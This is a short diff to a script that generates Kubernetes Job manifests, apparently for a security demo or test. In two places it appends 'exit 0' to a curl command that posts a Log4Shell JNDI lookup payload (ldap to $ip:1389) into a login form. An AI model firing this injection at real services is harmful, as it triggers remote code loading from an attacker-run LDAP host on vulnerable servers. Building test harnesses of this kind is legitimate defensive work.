@@ -133,7 +133,7 @@ spec:
             command:
             - /bin/sh
             - -c 
-            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login
+            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login; exit 0
           restartPolicy: Never
 eof
 
@@ -171,7 +171,7 @@ spec:
             command:
             - /bin/sh
             - -c
-            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login
+            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login; exit 0
           restartPolicy: Never
 eof
 
